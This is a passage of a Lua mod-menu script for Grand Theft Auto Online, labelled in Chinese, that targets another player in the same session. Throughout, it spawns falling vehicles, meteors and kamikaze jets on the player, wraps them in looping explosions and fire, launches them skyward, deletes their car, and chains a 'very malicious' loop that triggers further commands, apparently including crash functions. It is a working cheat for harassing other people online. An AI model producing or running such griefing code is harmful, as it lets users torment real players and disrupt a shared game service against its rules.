            wait()
        end
        TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
        wait(100)
        entities.create_object(rshit, c)
    end)
GTLP(tormentplayer, "车从他的头上下坠", {"rainveh"}, "", function(on_toggle)
    --notification("Rain Vehicles sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_vehicles_as_handles()
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.IS_ENTITY_IN_AIR(ped)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ped_c.x = ped_c.x + math.random(-5, 5)
            ped_c.y = ped_c.y + math.random(-5, 5)
            ped_c.z = ped_c.z + math.random(5, 10)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -1.0)
            wait(100)
        end
    end
end)
GTLP(tormentplayer, "物体从他的头上下坠", {"rainobj"}, "", function(on_toggle)
    --notification("Rain Objects sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_objects_as_handles()
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.IS_ENTITY_IN_AIR(ped)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ped_c.x = ped_c.x + math.random(-5, 5)
            ped_c.y = ped_c.y + math.random(-5, 5)
            ped_c.z = ped_c.z + math.random(5, 10)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -100.0)
            wait(0)
        end
    end
end)
    GTAC(tormentplayer,"绑架玩家", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash1 = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")
        if STREAMING.IS_MODEL_A_VEHICLE(hash1) then
            STREAMING.REQUEST_MODEL(hash1)
            while not STREAMING.HAS_MODEL_LOADED(hash1) do
                wait()
            end
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}
            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)
            table_kidnap[veh_to_attach] = entities.create_vehicle(hash1, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                wait()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
            wait(500)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash1)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
	end)
    GTLP(jindianegao, "垃圾风车", {"togglemills"}, "", function(on_toggle)
 --       if pid ~= players.user() then
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        wait(10)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        return
    end
    end)
    GTAC(jindianegao, "清除风车", {"clearwindmills"}, "", function()
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            wait()
        end
    end)
    function attachto(offx, offy, offz, pid, angx, angy, angz, hash, isnpc, isveh)
        atomicattachto = util.create_thread(function(thr)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
            coords.x = coords['x']
            coords.y = coords['y']
            coords.z = coords['z']
            if isnpc then
                obj = entities.create_ped(1, hash, coords, 90.0)
            elseif isveh then
                obj = entities.create_vehicle(hash, coords, 90.0)
            else
                obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
            end
            ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(obj, false, true)
                while true do
                    local player_coords = ENTITY.GET_ENTITY_COORDS(ped, false)
                    local obj_coords = ENTITY.GET_ENTITY_COORDS(obj, false)
                    local dist =  MISC.GET_DISTANCE_BETWEEN_COORDS(player_coords['x'], player_coords['y'], player_coords['z'], obj_coords['x'], obj_coords['y'], obj_coords['z'], false)
                    if dist > 0.1 then
                        local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offx, offy, offz)
                        ENTITY.SET_ENTITY_COORDS(obj, behind['x'], behind['y'], behind['z'], false, false, false, false)
                    end
                    if not stopato then
                    util.stop_thread()
                    if not ENTITY.DOES_ENTITY_EXIST(obj) then
                    end
                    attachto(offx, offy, offz, pid, angx, angy, angz, hash, isnpc, isveh)
                    end
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    if not players.exists(pid) then
                        gtoast(aatoast)
                        util.stop_thread()
                    else
                    end
                    wait()
                end
            end)
        end
    GTLP(jindianegao,"飞机啄他", {"kamikazelazer"}, "", function(on)
        local ped = 2459507570
        STREAMING.REQUEST_MODEL(ped)
        while not STREAMING.HAS_MODEL_LOADED(ped) do
            wait(100)
        end
        local lazer = 3013282534
        STREAMING.REQUEST_MODEL(lazer)
        while not STREAMING.HAS_MODEL_LOADED(lazer) do
            wait(100)
        end
        local pid = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        local spawn = VEHICLE.CREATE_VEHICLE(lazer, pid.x, pid.y, pid.z+20, 0, true, false, false)
        local pedspawn = PED.CREATE_PED(26, ped, pid.x, pid.y, pid.z+20, 0, true, false)
        PED.SET_PED_INTO_VEHICLE(pedspawn, spawn, -1)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(spawn, -20)
        ENTITY.SET_ENTITY_ROTATION(spawn, -90.0, 0.0, 0.0, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(spawn, 100)
        wait(3000)
    end)
    GTAC(jindianegao, "UFO吸附", {}, "生成UFO并牵引该玩家至空中", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 63
        local ufoModel = MISC.GET_HASH_KEY("p_spinning_anus_s")
        local ufo = entities.create_object(ufoModel, coords)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)
        if PED.IS_PED_IN_VEHICLE(player, vehicle, false) then 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            VEHICLE.BRING_VEHICLE_TO_HALT(vehicle, 3, 4, false)
            VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
            wait(6000)
            entities.delete_by_handle(ufo)
        else
            gtoast("玩家不在载具中") 
    end
    end)
    GTLP(jindianegao,"火箭撞击", {""}, "生成撞击在该玩家上方\n并且含有特殊的声音哟", function(on)
        local ped = 2459507570
        STREAMING.REQUEST_MODEL(ped)
        while not STREAMING.HAS_MODEL_LOADED(ped) do
            wait(100)
        end
        local lazer = 3013282534
        STREAMING.REQUEST_MODEL(lazer)
        while not STREAMING.HAS_MODEL_LOADED(lazer) do
            wait(100)
        end
        local pid = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        local spawn = VEHICLE.CREATE_VEHICLE(lazer, pid.x, pid.y, pid.z+150, 0, true, false, false)
        local pedspawn = PED.CREATE_PED(26, ped, pid.x, pid.y, pid.z+150, 0, true, false)
        ENTITY.SET_ENTITY_VISIBLE(spawn, false)
        PED.SET_PED_INTO_VEHICLE(pedspawn, spawn, -1)
        ENTITY.SET_ENTITY_VISIBLE(pedspawn, false)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(spawn, -20)
        ENTITY.SET_ENTITY_ROTATION(spawn, -90.0, 0.0, 0.0, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(spawn, 100)
        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local ufo_object = util.joaat("xs_prop_arena_airmissile_01a")
        STREAMING.REQUEST_MODEL(ufo_object)
        while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
            wait()
        end
        local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(0,pid), 0, 2, 3),ENTITY.GET_ENTITY_HEADING(id))
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        ENTITY.ATTACH_ENTITY_TO_ENTITY(0,object1, spawn, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, spawn)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(0,spawn, object1, 0, 1, 10, 0, 0, 0, -180, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(0,object1, spawn, 0, 1, 10, 0, 0, 0, -180, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(object1, true)
        wait(3000)
        entities.delete_by_handle(spawn)
        entities.delete_by_handle(pedspawn)
        entities.delete_by_handle(ufo_object)
        entities.delete_by_handle(object1)
    end)
    GTAC(jindianegao, "陨石撞击", {}, "用陨石碾碎该玩家", function() 
        local coords = players.get_position(pid)
        coords.z = coords.z + 10.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)
    GTAC(jindianegao, "随机惩罚", {}, "随机使用一种恶搞方式惩罚该玩家", function()
    local chosenPunishment = math.random(5)
    if chosenPunishment == 1 then 
        gtoast(players.get_name(pid).. " 会被碎布玩偶！")
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true) 
    end
    if chosenPunishment == 2 then 
        gtoast(players.get_name(pid).." 会被火箭击中！")
        local coords = players.get_position(pid)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z+15, coords.x, coords.y, coords.z, 100, true, -1312131151, playerPed, true, false, 50)
    end
    if chosenPunishment == 3 then 
        gtoast(players.get_name(pid).." 会被删除载具！")
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, true)
        entities.delete_by_handle(playerVehicle)
    end
    if chosenPunishment == 4 then 
        gtoast(players.get_name(pid).." 会被点燃！")
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 0, true, false, 0, false)
    end
    if chosenPunishment == 5 then 
        gtoast(players.get_name(pid).." 幸免了！")
    end
    end)
local mrplaym = GT(jindianegao, '在玩家身上下雨 ', {}, '')
local mir = {weap = 'WEAPON_SNOWBALL', speed = 1000}
local mirloop =  GTLP(mrplaym, '类型:雪球', {'rain'}, '启用下雨', function ()
      local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
      local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
      local weap = util.joaat(mir.weap)
      Delcar(targets)
      WEAPON.REQUEST_WEAPON_ASSET(weap,0,0)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z - 2.0, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 1.0, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y , tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      if not players.exists(pid) then
          if set.alert then
              gtoast('你正在让他们怒不可遏')
          end
          util.stop_thread()
      end
  end)
 GTLuaScript.list_action(mrplaym, '类型', {''}, '更改在玩家身上下雨的类型', Weaplist, function(weapsel, text)
      mir.weap = Weap[weapsel]
      GTluaScript.set_menu_name(mirloop, '在玩家身上下雨 ' ..': '.. text)
  end)
 local weaspeed = GTluaScript.slider(mrplaym, '下雨速度', {''}, '更改下雨的速度', 100, 6000, 1000, 100, function (s)
      mir.speed = s
  end)
    local player_jinx_army = {}
    local army_player = GT(jindianegao, "ikun军队", {}, "")
    GTluaScript.click_slider(army_player, "生成ikunx军队", {}, "", 1, 256, 30, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local jinx = util.joaat("a_c_hen")
        request_model(jinx)
        for i = 1, val do
            player_jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_jinx_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_jinx_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_jinx_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_jinx_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            wait()
        end 
    end)
    GTAC(army_player, "清除ikun军队", {}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_c_hen")) then
                entities.delete_by_handle(ped)
            end
        end
    end)
    GTAC(jindianegao, "弹射玩家", {}, "警告: 被大部分菜单检测", function()																																																	   
        local mdl = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(mdl)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            gtoast("玩家在载具中. :/")
        return end
        if TASK.IS_PED_WALKING(ped) then
            boxville = entities.create_vehicle(mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
            ENTITY.SET_ENTITY_VISIBLE(boxville, false)
            wait(250)
            local force
            repeat
                if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville)then
                    ENTITY.APPLY_FORCE_TO_ENTITY(boxville, 1, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                end
                wait()
                pos = ENTITY.GET_ENTITY_COORDS(ped)
            until pos.z > 10000.0
            wait(100)
            if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville) then 
                entities.delete_by_handle(boxville)
            end
        else
            gtoast("玩家必须在行走时才能发挥作用. :/")
        end
    end)
    GTLP(jindianegao,"切割机", {'qiegeji'},"使用直升机螺旋桨对玩家进行砍杀", function(click_type)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.z = coords['z']+2.5
        local hash = util.joaat("buzzard")
        request_model_load(hash)
        local heli = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(target_ped))
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, false)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, true)
        ENTITY.FREEZE_ENTITY_POSITION(heli, true)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(heli, true, true)
        ENTITY.SET_ENTITY_ROTATION(heli, 180, 0.0, ENTITY.GET_ENTITY_HEADING(target_ped), 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(heli, coords.x, coords.y, coords.z, true, false, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    end)
        local explosion_circle_angle = 0
        GTLP(jindianegao, "爆炸圈", {}, "在该玩家周围生成爆炸圈", function ()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explosion_circle(ped, explosion_circle_angle, 25)
        explosion_circle_angle += 0.15
        wait(50)
    end)
    GTTG(jindianegao, '发射烟花', {}, '弹飞玩家并把玩家变成烟花', function (on)
        if on then
        menu.set_value(weaspeed, 100)
        mir.weap = 'weapon_firework'
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        else
        menu.trigger_commands("rain".. players.get_name(pid))
        menu.trigger_commands("JuggleC".. players.get_name(pid))
        end
    end)
    GTLP(jindianegao, "砸死他", {}, "用陨石砸死他", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)
    GTAC(jindianegao, "大爆炸", {}, "炸死他奶奶滴", function() 
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        wait(50)
        defx = defx + 2
        defy = defy + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)
    xunhaunshijian = GT(jindianegao, "循环事件", {}, "", function(); end)
    GTTG(xunhaunshijian, '综合循环事件', {"zonghexh"}, '非常恶意的功能\n建议远离该玩家', function (on)
       if on then 
        menu.trigger_commands("flameloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv2".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv3".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("fangpi".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("xbaozha".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("dbaozha".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv4".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("flameloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("sybengkui1".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("sybengkui2".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("dalababb".. PLAYER.GET_PLAYER_NAME(pid))
        else
        menu.trigger_commands("flameloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv2".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv3".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("fangpi".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("xbaozha".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("dbaozha".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("waterloopv4".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("fgv2".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("fgv3".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("flameloop".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("sybengkui1".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("sybengkui2".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("dalababb".. PLAYER.GET_PLAYER_NAME(pid))
        end
    end)
    GTLP(xunhaunshijian, "循环爆炸", {""}, "经典恶搞", function()
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            wait(100)
        end
    end)
    GTLP(xunhaunshijian, "循环电磁", {""}, "经典恶搞", function()
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            wait(100)
        end
    end)
    GTLP(xunhaunshijian, "循环烟花", {""}, "经典恶搞", function()
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            wait(100)
        end
    end)
    GTLP(xunhaunshijian, "循环喷火", {"flameloop"}, "经典恶搞", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 2.0, 12, 1, true, false, 0, false)
    end)
    GTLP(xunhaunshijian, "循环喷火V2", {"waterloopv2"}, "经典恶搞", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环喷水", {"waterloop"}, "经典恶搞", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 2.0, 13, 1, true, false, 0, false)
    end)
    GTLP(xunhaunshijian, "循环喷水V2", {"waterloopv3"}, "经典恶搞", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环放屁", {"fangpi"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
